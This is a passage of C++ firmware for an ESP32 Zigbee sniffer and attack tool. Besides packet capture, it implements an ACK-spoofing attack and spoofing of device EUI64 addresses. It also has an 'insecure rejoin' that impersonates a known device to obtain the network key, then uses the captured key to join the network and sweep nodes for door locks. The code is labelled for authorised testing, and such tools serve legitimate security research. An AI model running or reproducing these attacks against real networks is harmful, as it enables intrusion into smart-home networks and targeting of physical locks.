    uint8_t ftype   = fcLow & ZB_FC_FRAME_TYPE_MASK;
    bool    ackReq  = (fcLow >> 5) & 0x01;
    uint8_t dstMode = (fcHigh >> 2) & 0x03;
    if (ftype == ZB_FC_FRAME_TYPE_DATA && ackReq && dstMode == ZB_ADDR_MODE_SHORT) {
      uint16_t dst = (uint16_t)frame[6] | ((uint16_t)frame[7] << 8);
      if (dst == zb_ackAttackTarget) {
        // Bare ACK: len(1)=5 | FC(2)=0x0200 | seq(1) | radio appends FCS(2)
        uint8_t ackBuf[4] = { 0x05, 0x02, 0x00, frame[3] };
        esp_ieee802154_transmit(ackBuf, false);
        zb_ackAttackCount++;
        // fall through: still queue the frame so it shows in the sniff log
      }
    }
  }

  ZbSnifferFrame sf;
  sf.len     = len - 2;                  // strip the 2-byte FCS
  sf.rssi    = fi ? fi->rssi : 0;
  sf.lqi     = fi ? fi->lqi  : 0;
  sf.channel = esp_ieee802154_get_channel();
  memcpy(sf.data, &frame[1], sf.len);

  BaseType_t woken = pdFALSE;
  xQueueSendFromISR(zb_rx_queue, &sf, &woken);
  if (woken)
    portYIELD_FROM_ISR();
}

bool ZBScan::zbRadioInit(uint8_t channel) {
  this->zb_channel = constrain(channel, ZIGBEE_MIN_CHANNEL, ZIGBEE_MAX_CHANNEL);

  if (!zb_rx_queue) {
    zb_rx_queue = xQueueCreate(ZIGBEE_QUEUE_DEPTH, sizeof(ZbSnifferFrame));
    if (!zb_rx_queue)
      return false;
  }

  if (esp_ieee802154_enable() != ESP_OK)
    return false;

  esp_ieee802154_set_promiscuous(true);
  esp_ieee802154_set_coordinator(false);
  esp_ieee802154_set_rx_when_idle(true);
  esp_ieee802154_set_panid(0xFFFF);
  esp_ieee802154_set_short_address(0xFFFF);

  uint8_t eui64[8] = {};
  esp_read_mac(eui64, ESP_MAC_IEEE802154);
  esp_ieee802154_set_extended_address(eui64);
  esp_ieee802154_set_channel(this->zb_channel);

  // Record our own EUI64 for the TX / simulation path. esp_read_mac() returns
  // canonical (printed, MSB-first) order; build the big-integer form that
  // matches srcExtended/dstExtended, and keep the raw bytes to restore the
  // radio's programmed address after a spoof. (Mirrors C6_zigbee init().)
  this->zb_ownEUI64 = 0;
  for (int i = 0; i < 8; i++)
    this->zb_ownEUI64 = (this->zb_ownEUI64 << 8) | eui64[i];
  this->zb_hwEUI64 = this->zb_ownEUI64;
  memcpy(this->zb_hwEUI64Bytes, eui64, 8);

  this->zb_initialized = true;
  Serial.printf("[ZBScan] 802.15.4 radio initialised on channel %u\n", this->zb_channel);
  return true;
}

bool ZBScan::zbRadioStart() {
  if (!this->zb_initialized && !this->zbRadioInit(this->zb_channel))
    return false;
  if (this->zb_running)
    return true;
  if (esp_ieee802154_receive() != ESP_OK)
    return false;
  this->zb_running = true;
  return true;
}

void ZBScan::zbRadioStop() {
  if (this->zb_running) {
    esp_ieee802154_sleep();
    this->zb_running = false;
  }
  if (this->zb_initialized) {
    esp_ieee802154_disable();
    this->zb_initialized = false;
  }
}

void ZBScan::zbSetChannel(uint8_t channel) {
  this->zb_channel = constrain(channel, ZIGBEE_MIN_CHANNEL, ZIGBEE_MAX_CHANNEL);
  esp_ieee802154_set_channel(this->zb_channel);
  esp_ieee802154_receive();
}

void ZBScan::zbChannelHop() {
  uint8_t next = this->zb_channel + 1;
  if (next > ZIGBEE_MAX_CHANNEL)
    next = ZIGBEE_MIN_CHANNEL;
  this->zbSetChannel(next);
}

// ===========================================================================
// Transmit primitives (ported from C6_zigbee IEEE802154Sniffer). The 2.4GHz
// front end is shared, so each TX sleeps the radio, transmits, then resumes
// RX. FOR AUTHORISED TESTING OF YOUR OWN NETWORK ONLY.
// ===========================================================================

bool ZBScan::zbSendRawFrame(const uint8_t *frame, uint8_t frameLen) {
  if (frameLen == 0 || frameLen > ZIGBEE_MAX_FRAME_LEN - 3) return false;

  // IDF transmit buffer: [length byte][frame...]; length includes the 2-byte
  // FCS the radio appends.
  uint8_t txBuf[ZIGBEE_MAX_FRAME_LEN];
  txBuf[0] = frameLen + 2;
  memcpy(&txBuf[1], frame, frameLen);

  esp_ieee802154_sleep();
  esp_err_t err = esp_ieee802154_transmit(txBuf, false);
  delay(5);
  esp_ieee802154_receive();           // back to RX
  this->zb_running = true;

  if (err != ESP_OK) {
    Serial.printf("[ZBTX] sendRawFrame failed (%d)\n", (int)err);
    return false;
  }
  return true;
}

void ZBScan::zbSetOwnEUI64(uint64_t eui64) {
  this->zb_ownEUI64 = eui64;
  uint8_t buf[8];
  for (int i = 0; i < 8; i++) buf[i] = (uint8_t)(eui64 >> (8 * i));  // on-air LE
  esp_ieee802154_set_extended_address(buf);
  Serial.printf("[ZBTX] Own EUI64 set to %016llX%s\n",
                (unsigned long long)eui64,
                (eui64 == this->zb_hwEUI64) ? " (hardware)" : " (SPOOFED)");
}

void ZBScan::zbRestoreOwnEUI64() {
  this->zb_ownEUI64 = this->zb_hwEUI64;
  esp_ieee802154_set_extended_address(this->zb_hwEUI64Bytes);
  Serial.printf("[ZBTX] Own EUI64 restored to hardware %016llX\n",
                (unsigned long long)this->zb_hwEUI64);
}

bool ZBScan::zbSendAck(uint8_t seqNum) {
  uint8_t frame[3] = { 0x02, 0x00, seqNum };   // FC: type=ACK, no addressing
  return this->zbSendRawFrame(frame, sizeof(frame));
}

void ZBScan::zbStartAckAttack(uint16_t target) {
  zb_ackAttackTarget = target;
  zb_ackAttackCount  = 0;
  zb_ackAttackActive = true;
  Serial.printf("[ZBATTACK] ACK-attack armed against 0x%04X\n", target);
}

void ZBScan::zbStopAckAttack() {
  zb_ackAttackActive = false;
  Serial.printf("[ZBATTACK] ACK-attack stopped (0x%04X, %lu ACKs)\n",
                zb_ackAttackTarget, (unsigned long)zb_ackAttackCount);
}

// MAC Beacon Request (Cmd 0x07), broadcast - solicits beacons for scanning.
bool ZBScan::zbSendBeaconRequest() {
  static uint8_t seq = 0;
  uint8_t frame[8] = {
    0x03, 0x08, seq++,          // FC: MAC cmd; dst=short, src=none
    0xFF, 0xFF,                 // dst PAN broadcast
    0xFF, 0xFF,                 // dst addr broadcast
    0x07                        // Cmd: Beacon Request
  };
  return this->zbSendRawFrame(frame, sizeof(frame));
}

// MAC Association Request (Cmd 0x01) to a parent advertising permit-join. We
// have no short address yet, so we source by our EUI64 with src PAN 0xFFFF.
bool ZBScan::zbSendAssociationRequest(uint16_t dstPan, uint16_t dstShortAddr,
                                      uint8_t capabilityInfo) {
  static uint8_t seq = 0;
  uint8_t frame[19];
  frame[0] = 0x23;              // FC lo: MAC cmd, ack request
  frame[1] = 0xC8;              // FC hi: dst=short, src=extended
  frame[2] = seq++;
  frame[3] = (uint8_t)(dstPan & 0xFF);
  frame[4] = (uint8_t)(dstPan >> 8);
  frame[5] = (uint8_t)(dstShortAddr & 0xFF);
  frame[6] = (uint8_t)(dstShortAddr >> 8);
  frame[7] = 0xFF; frame[8] = 0xFF;                 // src PAN 0xFFFF (unassociated)
  for (int i = 0; i < 8; i++)
    frame[9 + i] = (uint8_t)(this->zb_ownEUI64 >> (8 * i));  // src EUI64, on-air LE
  frame[17] = ZB_MAC_CMD_ASSOC_REQUEST;
  frame[18] = capabilityInfo;
  return this->zbSendRawFrame(frame, sizeof(frame));
}

// MAC Data Request (Cmd 0x04) - poll the parent for an indirectly-queued frame
// (Association Response, Transport Key). Before association use the extended
// address; afterwards use the assigned short address.
bool ZBScan::zbSendDataRequest(uint16_t dstPan, uint16_t dstShortAddr,
                               bool useOwnShortAddr, uint16_t ownShortAddr) {
  static uint8_t seq = 0;
  uint8_t frame[18];
  uint8_t len;

  if (useOwnShortAddr) {
    frame[0] = 0x63;           // FC lo: MAC cmd, ack req, PAN ID compression
    frame[1] = 0x88;           // FC hi: dst=short, src=short
    frame[2] = seq++;
    frame[3] = (uint8_t)(dstPan & 0xFF);
    frame[4] = (uint8_t)(dstPan >> 8);
    frame[5] = (uint8_t)(dstShortAddr & 0xFF);
    frame[6] = (uint8_t)(dstShortAddr >> 8);
    frame[7] = (uint8_t)(ownShortAddr & 0xFF);
    frame[8] = (uint8_t)(ownShortAddr >> 8);
    frame[9] = ZB_MAC_CMD_DATA_REQUEST;
    len = 10;
  } else {
    frame[0] = 0x23;           // FC lo: MAC cmd, ack req
    frame[1] = 0xC8;           // FC hi: dst=short, src=extended
    frame[2] = seq++;
    frame[3] = (uint8_t)(dstPan & 0xFF);
    frame[4] = (uint8_t)(dstPan >> 8);
    frame[5] = (uint8_t)(dstShortAddr & 0xFF);
    frame[6] = (uint8_t)(dstShortAddr >> 8);
    frame[7] = 0xFF; frame[8] = 0xFF;
    for (int i = 0; i < 8; i++)
      frame[9 + i] = (uint8_t)(this->zb_ownEUI64 >> (8 * i));
    frame[17] = ZB_MAC_CMD_DATA_REQUEST;
    len = 18;
  }
  return this->zbSendRawFrame(frame, len);
}

// ===========================================================================
// Join a network as an end device (ported from C6_zigbee ZbJoiner).
// ===========================================================================
#define ZB_JOIN_POLL_INTERVAL_MS 300
#define ZB_JOIN_TIMEOUT_MS       8000
#define ZB_JOIN_MAX_POLLS        30
#define ZB_MAC_CMD_ASSOC_RESPONSE 0x02

bool ZBScan::zbJoinStart(uint16_t parentShort, uint16_t parentPan, uint8_t cap) {
  if (!this->zbSendAssociationRequest(parentPan, parentShort, cap))
    return false;
  this->zb_joinParentShort   = parentShort;
  this->zb_joinParentPan     = parentPan;
  this->zb_joinAssignedShort = 0xFFFE;
  this->zb_joinStartMs       = millis();
  this->zb_joinLastPollMs    = this->zb_joinStartMs;
  this->zb_joinPollCount     = 0;
  this->zb_joinPhase         = ZB_JOIN_WAIT;
  Serial.printf("[ZBJOIN] Assoc Request -> 0x%04X (PAN 0x%04X) EUI64 %016llX cap 0x%02X\n",
                parentShort, parentPan, (unsigned long long)this->zb_ownEUI64, cap);
  return true;
}

void ZBScan::zbJoinAbort() {
  if (this->zb_joinPhase == ZB_JOIN_WAIT) {
    this->zb_joinPhase = ZB_JOIN_IDLE;
    Serial.println(F("[ZBJOIN] Aborted"));
  }
}

void ZBScan::zbJoinUpdate() {
  if (this->zb_joinPhase != ZB_JOIN_WAIT) return;
  uint32_t now = millis();
  if ((now - this->zb_joinStartMs) > ZB_JOIN_TIMEOUT_MS ||
      this->zb_joinPollCount >= ZB_JOIN_MAX_POLLS) {
    this->zb_joinPhase = ZB_JOIN_FAILED;
    Serial.printf("[ZBJOIN] Timed out waiting for Assoc Response from 0x%04X\n",
                  this->zb_joinParentShort);
    return;
  }
  if ((now - this->zb_joinLastPollMs) < ZB_JOIN_POLL_INTERVAL_MS) return;
  this->zb_joinLastPollMs = now;
  this->zb_joinPollCount++;
  // Poll the parent (extended-addressed - no short address yet) for the queued
  // Association Response.
  this->zbSendDataRequest(this->zb_joinParentPan, this->zb_joinParentShort, false);
}

void ZBScan::zbJoinProcessFrame(const ZbFrameInfo &info, const uint8_t *raw,
                                uint8_t rawLen, uint8_t macOff) {
  if (this->zb_joinPhase != ZB_JOIN_WAIT) return;
  if (info.frameType != ZB_FC_FRAME_TYPE_MACCMD) return;

  uint8_t cmdId = (macOff < rawLen) ? raw[macOff] : 0xFF;
  if (cmdId != ZB_MAC_CMD_ASSOC_RESPONSE) return;

  // The Association Response is addressed to us by our EUI64; ignore ones meant
  // for a different joining device.
  if (info.dstExtended != this->zb_ownEUI64) return;

  if (macOff + 4 > rawLen) return;   // cmd(1)+shortAddr(2)+status(1)
  uint16_t shortAddr = (uint16_t)raw[macOff + 1] | ((uint16_t)raw[macOff + 2] << 8);
  uint8_t  status    = raw[macOff + 3];

  if (status == 0x00) {
    this->zb_joinAssignedShort = shortAddr;
    this->zb_joinPhase         = ZB_JOIN_ASSOCIATED;
    Serial.printf("[ZBJOIN] *** Associated! short 0x%04X via parent 0x%04X ***\n",
                  shortAddr, this->zb_joinParentShort);
  } else {
    this->zb_joinPhase = ZB_JOIN_FAILED;
    Serial.printf("[ZBJOIN] Association rejected by 0x%04X: %s (0x%02X)\n",
                  this->zb_joinParentShort, zbAssocStatusName(status), status);
  }
}

const char *ZBScan::zbAssocStatusName(uint8_t status) {
  switch (status) {
    case 0x00: return "SUCCESS";
    case 0x01: return "PAN_AT_CAPACITY";
    case 0x02: return "PAN_ACCESS_DENIED";
    default:   return "RESERVED";
  }
}

void ZBScan::zbJoinPrintStatus() const {
  switch (this->zb_joinPhase) {
    case ZB_JOIN_IDLE:
      Serial.println(F("[ZBJOIN] Idle")); break;
    case ZB_JOIN_WAIT:
      Serial.printf("[ZBJOIN] Waiting for 0x%04X (%u polls)\n",
                    this->zb_joinParentShort, this->zb_joinPollCount); break;
    case ZB_JOIN_ASSOCIATED:
      Serial.printf("[ZBJOIN] Associated as 0x%04X via 0x%04X\n",
                    this->zb_joinAssignedShort, this->zb_joinParentShort); break;
    case ZB_JOIN_FAILED:
      Serial.printf("[ZBJOIN] Last attempt to 0x%04X failed\n",
                    this->zb_joinParentShort); break;
  }
}

// ===========================================================================
// Offensive: insecure rejoin (ported from C6_zigbee ZbAttack). Impersonate a
// known device and send an UNSECURED NWK Rejoin Request; a permissive Trust
// Center then transports the network key under the default TCLK, recovered by
// the key-capture pipeline. FOR AUTHORISED TESTING OF YOUR OWN NETWORK ONLY.
// ===========================================================================
bool ZBScan::zbInsecureRejoin(uint16_t targetShortAddr) {
  int idx = this->zbFindNode(targetShortAddr);
  if (idx < 0) {
    Serial.printf("[ZBATTACK] insecure_rejoin: unknown host 0x%04X\n", targetShortAddr);
    return false;
  }
  ZigbeeNode node = zigbee_nodes->get(idx);
  if (node.ext_addr == 0) {
    Serial.printf("[ZBATTACK] insecure_rejoin: no captured EUI64 for 0x%04X\n",
                  targetShortAddr);
    return false;
  }
  uint16_t pan = node.pan_id;
  if (pan == 0 || pan == 0xFFFF) {
    Serial.printf("[ZBATTACK] insecure_rejoin: unknown PAN for 0x%04X\n", targetShortAddr);
    return false;
  }

  Serial.printf("[ZBATTACK] insecure_rejoin: impersonating 0x%04X (EUI64 %016llX) PAN 0x%04X\n",
                targetShortAddr, (unsigned long long)node.ext_addr, pan);
  // Spoof the target's EUI64 so the coordinator trusts the rejoin and any
  // Transport Key is addressed to that EUI64.
  this->zbSetOwnEUI64(node.ext_addr);

  if (!this->zbSendRejoinRequest(0x0000, pan, node.ext_addr)) {
    Serial.println(F("[ZBATTACK] insecure_rejoin: TX failed"));
    return false;
  }
  Serial.println(F("[ZBATTACK] Unsecured Rejoin Request sent. Watch for a captured key."));
  Serial.println(F("[ZBATTACK] EUI64 still SPOOFED - restore the hardware MAC when done."));
  return true;
}

// Build + send an unsecured NWK Rejoin Request wrapped in a MAC data frame.
// No NWK security header - that is what makes it the *insecure* rejoin.
bool ZBScan::zbSendRejoinRequest(uint16_t coordShort, uint16_t pan,
                                 uint64_t spoofEui64) {
  static uint8_t macSeq = 0;
  uint8_t frame[ZIGBEE_MAX_FRAME_LEN];
  uint8_t off = 0;

  // MAC: data frame, ACK req, PAN-ID compression, dst=short, src=extended.
  frame[off++] = 0x61;
  frame[off++] = 0xC8;
  frame[off++] = macSeq++;
  frame[off++] = (uint8_t)(pan & 0xFF);
  frame[off++] = (uint8_t)(pan >> 8);
  frame[off++] = (uint8_t)(coordShort & 0xFF);
  frame[off++] = (uint8_t)(coordShort >> 8);
  for (int i = 0; i < 8; i++) frame[off++] = (uint8_t)(spoofEui64 >> (8 * i));

  // NWK: command frame, protocol version 2, security OFF, source IEEE present.
  uint16_t nwkFc = 0x0009 | ZB_NWK_FC_EXT_SRC;
  frame[off++] = (uint8_t)(nwkFc & 0xFF);
  frame[off++] = (uint8_t)(nwkFc >> 8);
  frame[off++] = (uint8_t)(coordShort & 0xFF);
  frame[off++] = (uint8_t)(coordShort >> 8);
  frame[off++] = 0xFF; frame[off++] = 0xFF;    // NWK src 0xFFFF (no short addr)
  frame[off++] = 1;                            // radius
  frame[off++] = this->zb_attackNwkSeq++;
  for (int i = 0; i < 8; i++) frame[off++] = (uint8_t)(spoofEui64 >> (8 * i));  // src IEEE

  // NWK payload: Rejoin Request + MAC capability.
  frame[off++] = 0x06;                         // NWK cmd: Rejoin Request
  frame[off++] = ZB_ASSOC_CAP_ALLOC_ADDR;

  return this->zbSendRawFrame(frame, off);
}

// ===========================================================================
// ZDO ping + door-lock discovery (ported from C6_zigbee ZbPing). Builds ZDO
// requests inside an APS Data frame, NWK-encrypts with the captured network
// key (CCM*), and wraps in a MAC data frame. Requires a successful join (own
// short address) + a captured network key. No door-lock actuation.
//
// Layering (innermost -> outermost):
//   ZDO:  TransactionSeq(1) + request payload
//   APS:  FC(1) dstEP(1) cluster(2) profile(2) srcEP(1) counter(1) + ZDO
//   NWK:  FC(2) dst(2) src(2) radius(1) seq(1) + AUX + CCM*(APS) + MIC(4)
//   MAC:  FC(2) seq(1) dstPAN(2) dst(2) src(2) [PAN-ID compressed] + NWK
// CCM* nonce = srcEUI64(8,LE) | frameCounter(4,LE) | secCtrl(1); AAD = NWK+AUX.
// ===========================================================================

void ZBScan::zbPingSeed() {
  if (this->zb_pingSeeded) return;
  // Seed counters from the HWRNG so a reboot does not reuse a frame counter
  // under the same key/EUI64 (CCM* nonce uniqueness).
  uint32_t seed = esp_random();
  this->zb_nwkFrameCounter = seed;
  this->zb_pingMacSeq      = (uint8_t)(seed >> 8);
  this->zb_pingNwkSeq      = (uint8_t)(seed >> 16);
  this->zb_apsCounter      = (uint8_t)(seed >> 24);
  this->zb_pingSeeded      = true;
}

bool ZBScan::zbSendApsData(uint8_t dstEp, uint8_t srcEp, uint16_t cluster,
                           uint16_t profile, const uint8_t *payload,
                           uint8_t payloadLen, uint16_t target, uint16_t pan) {
  uint8_t aps[32];
  if (8 + (int)payloadLen > (int)sizeof(aps)) return false;
  aps[0] = 0x00;                       // APS FC: Data, unicast, unsecured
  aps[1] = dstEp;
  aps[2] = (uint8_t)(cluster & 0xFF);
  aps[3] = (uint8_t)(cluster >> 8);
  aps[4] = (uint8_t)(profile & 0xFF);
  aps[5] = (uint8_t)(profile >> 8);
  aps[6] = srcEp;
  aps[7] = this->zb_apsCounter++;
  for (uint8_t i = 0; i < payloadLen; i++) aps[8 + i] = payload[i];
  return this->zbNwkEncryptAndSend(pan, target, aps, 8 + payloadLen);
}

int ZBScan::zbSendZdoReq(uint16_t cluster, uint16_t target, uint16_t pan,
                         const uint8_t *extra, uint8_t extraLen) {
  uint8_t seq = this->zb_zdoSeq++;
  uint8_t body[16];
  if (1 + (int)extraLen > (int)sizeof(body)) return -1;
  body[0] = seq;
  for (uint8_t i = 0; i < extraLen; i++) body[1 + i] = extra[i];
  if (!this->zbSendApsData(ZB_ZDO_EP, ZB_ZDO_EP, cluster, ZB_ZDO_PROFILE_ID,
                           body, 1 + extraLen, target, pan))
    return -1;
  return seq;
}

bool ZBScan::zbPing(uint16_t targetShortAddr, uint16_t targetPan) {
  if (!this->zbJoinAssociated()) {
    Serial.println(F("[ZBPING] Not associated - 'zbjoin' first")); return false;
  }
  if (!this->zbFindLatestNetworkKey()) {
    Serial.println(F("[ZBPING] No network key captured - can't encrypt")); return false;
  }
  this->zbPingSeed();
  uint8_t noi[2] = { (uint8_t)(targetShortAddr & 0xFF), (uint8_t)(targetShortAddr >> 8) };
  int seq = this->zbSendZdoReq(ZB_ZDO_NODE_DESC_REQ, targetShortAddr, targetPan, noi, 2);
  if (seq < 0) return false;
  this->zbAllocPending(targetShortAddr, targetPan, (uint8_t)seq);
  Serial.printf("[ZBPING] Node_Desc_req -> 0x%04X (zdoSeq=%u)\n", targetShortAddr, seq);
  return true;
}

bool ZBScan::zbFindLock(uint16_t targetShortAddr, uint16_t targetPan) {
  if (!this->zbJoinAssociated()) {
    Serial.println(F("[ZBLOCK] Not associated - 'zbjoin' first")); return false;
  }
  if (!this->zbFindLatestNetworkKey()) {
    Serial.println(F("[ZBLOCK] No network key captured - can't probe")); return false;
  }
  if (this->zb_lockPhase != ZB_LOCK_IDLE) {
    Serial.printf("[ZBLOCK] Busy scanning 0x%04X\n", this->zb_lockTarget); return false;
  }
  this->zbPingSeed();
  this->zb_lockSweeping = false;
  return this->zbStartLockScan(targetShortAddr, targetPan);
}

void ZBScan::zbFindLockSweepAll() {
  if (!this->zbJoinAssociated() || !this->zbFindLatestNetworkKey()) {
    Serial.println(F("[ZBLOCK] Need a join + a captured network key first")); return;
  }
  this->zbPingSeed();
  this->zb_sweepLen = 0; this->zb_sweepIdx = 0; this->zb_sweepPan = 0xFFFF;
  int n = (zigbee_nodes != nullptr) ? zigbee_nodes->size() : 0;
  for (int i = 0; i < n && this->zb_sweepLen < ZB_LOCK_MAX_SWEEP; i++) {
    ZigbeeNode node = zigbee_nodes->get(i);
    if (node.short_addr == 0xFFFE || node.short_addr == 0xFFFF) continue;
    if (node.short_addr == 0x0000) continue;   // skip coordinator
    this->zb_sweepQueue[this->zb_sweepLen++] = node.short_addr;
    if (this->zb_sweepPan == 0xFFFF && node.pan_id && node.pan_id != 0xFFFF)
      this->zb_sweepPan = node.pan_id;
  }
  if (this->zb_sweepLen == 0) { Serial.println(F("[ZBLOCK] No hosts to sweep")); return; }
  this->zb_lockSweeping = true;
  Serial.printf("[ZBLOCK] Sweeping %u host(s) for the Door Lock cluster\n", this->zb_sweepLen);
  this->zbNextSweepOrIdle();
}

bool ZBScan::zbStartLockScan(uint16_t target, uint16_t pan) {
  this->zb_lockTarget = target; this->zb_lockPan = pan;
  this->zb_lockFound = false; this->zb_lockEpCount = 0; this->zb_lockEpIndex = 0;
  uint8_t noi[2] = { (uint8_t)(target & 0xFF), (uint8_t)(target >> 8) };
  if (this->zbSendZdoReq(ZB_ZDO_ACTIVE_EP_REQ, target, pan, noi, 2) < 0) {
    Serial.printf("[ZBLOCK] TX failed for 0x%04X\n", target);
    this->zb_lockPhase = ZB_LOCK_IDLE; return false;
  }
  this->zb_lockPhase = ZB_LOCK_WAIT_ACTIVE_EP;
  this->zb_lockSentMs = millis();
  Serial.printf("[ZBLOCK] Probing 0x%04X (Active_EP_req)\n", target);
  return true;
}

void ZBScan::zbSendSimpleDescReq(uint8_t endpoint) {
  uint8_t body[3] = { (uint8_t)(this->zb_lockTarget & 0xFF),
                      (uint8_t)(this->zb_lockTarget >> 8), endpoint };
  this->zbSendZdoReq(ZB_ZDO_SIMPLE_DESC_REQ, this->zb_lockTarget, this->zb_lockPan, body, 3);
  this->zb_lockSentMs = millis();
}

void ZBScan::zbFinishLockTarget() {
  if (this->zb_lockFound)
    Serial.printf("[ZBLOCK] *** 0x%04X IS A DOOR LOCK (cluster 0x0101) ***\n",
                  this->zb_lockTarget);
  else if (!this->zb_lockSweeping)
    Serial.printf("[ZBLOCK] 0x%04X: no Door Lock cluster\n", this->zb_lockTarget);
  this->zb_lockPhase = ZB_LOCK_IDLE;
  this->zbNextSweepOrIdle();
}

void ZBScan::zbNextSweepOrIdle() {
  if (!this->zb_lockSweeping) return;
  if (this->zb_sweepIdx >= this->zb_sweepLen) {
    this->zb_lockSweeping = false;
    Serial.println(F("[ZBLOCK] Sweep complete"));
    return;
  }
  uint16_t next = this->zb_sweepQueue[this->zb_sweepIdx++];
  this->zbStartLockScan(next, this->zb_sweepPan);
}

void ZBScan::zbPingUpdate() {
  uint32_t now = millis();
  for (int i = 0; i < ZB_PING_MAX_PENDING; i++) {
    if (this->zb_pending[i].active &&
        (now - this->zb_pending[i].sentAt_ms) > ZB_PING_TIMEOUT_MS) {
      Serial.printf("[ZBPING] Timeout: no response from 0x%04X\n", this->zb_pending[i].target);
      this->zb_pending[i].active = false;
    }
  }
  if (this->zb_lockPhase != ZB_LOCK_IDLE &&
      (now - this->zb_lockSentMs) > ZB_LOCK_STEP_TIMEOUT_MS) {
    if (this->zb_lockPhase == ZB_LOCK_WAIT_ACTIVE_EP) {
      if (!this->zb_lockSweeping)
        Serial.printf("[ZBLOCK] 0x%04X: no Active_EP response\n", this->zb_lockTarget);
      this->zb_lockPhase = ZB_LOCK_IDLE;
      this->zbNextSweepOrIdle();
    } else {
      this->zb_lockEpIndex++;
      if (this->zb_lockEpIndex < this->zb_lockEpCount)
        this->zbSendSimpleDescReq(this->zb_lockEndpoints[this->zb_lockEpIndex]);
      else
        this->zbFinishLockTarget();
    }
  }
}

void ZBScan::zbPingProcessFrame(const ZbFrameInfo &info, const uint8_t *raw,
                                uint8_t rawLen, uint8_t macOff) {
  if (!info.isZigbee || info.frameType != ZB_FC_FRAME_TYPE_DATA) return;
  if (!info.hasNwk || info.zbNwkType != ZB_NWK_TYPE_DATA) return;
  if (!info.zbNwkSecurity) return;
  if (zb_is_bcast(info.nwkDst)) return;

  uint16_t src = info.nwkSrc;
  ZbPendingPing *p = this->zbFindPending(src);
  bool wantLock = (this->zb_lockPhase != ZB_LOCK_IDLE && src == this->zb_lockTarget);
  if (!p && !wantLock) return;

  if (macOff >= rawLen) return;
  const uint8_t *nwk = raw + macOff;
  uint8_t nwkLen = rawLen - macOff;

  uint8_t plain[96];
  uint8_t plainLen = 0;
  if (!this->zbNwkDecrypt(nwk, nwkLen, src, plain, plainLen)) return;
  if (plainLen < 8) return;

  uint8_t apsFc = plain[0];
  if ((apsFc & 0x03) != 0x00) return;        // not APS Data
  if ((apsFc >> 5) & 0x01) return;           // APS-secured: not handled

  uint16_t cluster = (uint16_t)plain[2] | ((uint16_t)plain[3] << 8);
  uint16_t profile = (uint16_t)plain[4] | ((uint16_t)plain[5] << 8);
  if (profile != ZB_ZDO_PROFILE_ID) return;

  const uint8_t *zdo = plain + 8;
  uint8_t zdoLen = plainLen - 8;

  switch (cluster) {
    case ZB_ZDO_NODE_DESC_RSP: {
      if (!p) return;
      if (zdoLen < 17) return;               // seq+status+nwkAddr+nodeDesc(13)
      uint32_t rtt = millis() - p->sentAt_ms;
      p->active = false;
      if (zdo[1] != 0x00) {
        Serial.printf("[ZBPING] 0x%04X ZDO status 0x%02X\n", src, zdo[1]);
        return;
      }
      this->zbReportNodeDesc(src, &zdo[4], rtt);
      return;
    }
    case ZB_ZDO_ACTIVE_EP_RSP:
      if (wantLock) this->zbHandleActiveEpRsp(src, zdo, zdoLen);
      return;
    case ZB_ZDO_SIMPLE_DESC_RSP:
      if (wantLock) this->zbHandleSimpleDescRsp(src, zdo, zdoLen);
      return;
    default:
      return;
  }
}

// Active_EP_rsp: seq(1) status(1) nwkAddr(2) epCount(1) endpoints(epCount)
void ZBScan::zbHandleActiveEpRsp(uint16_t src, const uint8_t *zdo, uint8_t zdoLen) {
  if (this->zb_lockPhase != ZB_LOCK_WAIT_ACTIVE_EP) return;
  if (zdoLen < 5) return;
  if (zdo[1] != 0x00) { this->zbFinishLockTarget(); return; }
  uint8_t epCount = zdo[4];
  if (epCount == 0 || (5 + epCount) > zdoLen) { this->zbFinishLockTarget(); return; }
  this->zb_lockEpCount = (epCount > ZB_LOCK_MAX_ENDPOINTS) ? ZB_LOCK_MAX_ENDPOINTS : epCount;
  for (uint8_t i = 0; i < this->zb_lockEpCount; i++) this->zb_lockEndpoints[i] = zdo[5 + i];
  this->zb_lockEpIndex = 0;
  this->zb_lockPhase = ZB_LOCK_WAIT_SIMPLE_DESC;
  this->zbSendSimpleDescReq(this->zb_lockEndpoints[0]);
}

// Simple_Desc_rsp: seq(1) status(1) nwkAddr(2) length(1) + Simple Descriptor.
void ZBScan::zbHandleSimpleDescRsp(uint16_t src, const uint8_t *zdo, uint8_t zdoLen) {
  if (this->zb_lockPhase != ZB_LOCK_WAIT_SIMPLE_DESC) return;
  if (zdoLen >= 5 && zdo[1] == 0x00) {
    const uint8_t *d = &zdo[5];
    uint8_t descLen = zdo[4];
    if (descLen >= 7 && (5 + descLen) <= zdoLen) {
      uint8_t  ep      = d[0];
      uint16_t profId  = (uint16_t)d[1] | ((uint16_t)d[2] << 8);
      uint8_t  inCount = d[6];
      uint8_t  o = 7;
      bool epHasLock = false;
      for (uint8_t i = 0; i < inCount && (o + 1) < descLen; i++, o += 2) {
        uint16_t c = (uint16_t)d[o] | ((uint16_t)d[o + 1] << 8);
        if (c == ZB_CLUSTER_DOOR_LOCK) epHasLock = true;
      }
      if (o < descLen) {
        uint8_t outCount = d[o++];
        for (uint8_t i = 0; i < outCount && (o + 1) < descLen; i++, o += 2) {
          uint16_t c = (uint16_t)d[o] | ((uint16_t)d[o + 1] << 8);
          if (c == ZB_CLUSTER_DOOR_LOCK) epHasLock = true;
        }
      }
      if (epHasLock) {
        this->zb_lockFound = true;
        this->zbRecordLockInfo(src, this->zb_lockPan, ep, profId);
        Serial.printf("[ZBLOCK] 0x%04X ep %u (profile 0x%04X) exposes Door Lock\n",
                      src, ep, profId);
      }
    }
  }
  this->zb_lockEpIndex++;
  if (this->zb_lockEpIndex < this->zb_lockEpCount)
    this->zbSendSimpleDescReq(this->zb_lockEndpoints[this->zb_lockEpIndex]);
  else
    this->zbFinishLockTarget();
}

void ZBScan::zbPrintLockStatus() const {
  switch (this->zb_lockPhase) {
    case ZB_LOCK_IDLE: Serial.println(F("[ZBLOCK] Idle")); break;
    case ZB_LOCK_WAIT_ACTIVE_EP:
      Serial.printf("[ZBLOCK] Scanning 0x%04X (endpoint list)\n", this->zb_lockTarget); break;
    case ZB_LOCK_WAIT_SIMPLE_DESC:
      Serial.printf("[ZBLOCK] Scanning 0x%04X (ep %u/%u)\n",
                    this->zb_lockTarget, this->zb_lockEpIndex + 1, this->zb_lockEpCount); break;
  }
  for (int i = 0; i < ZB_LOCK_MAX_INFO; i++)
    if (this->zb_locks[i].valid)
      Serial.printf("[ZBLOCK] Located lock: 0x%04X ep %u profile 0x%04X\n",
                    this->zb_locks[i].addr, this->zb_locks[i].endpoint,
                    this->zb_locks[i].profile);
}

ZbPendingPing *ZBScan::zbFindPending(uint16_t target) {
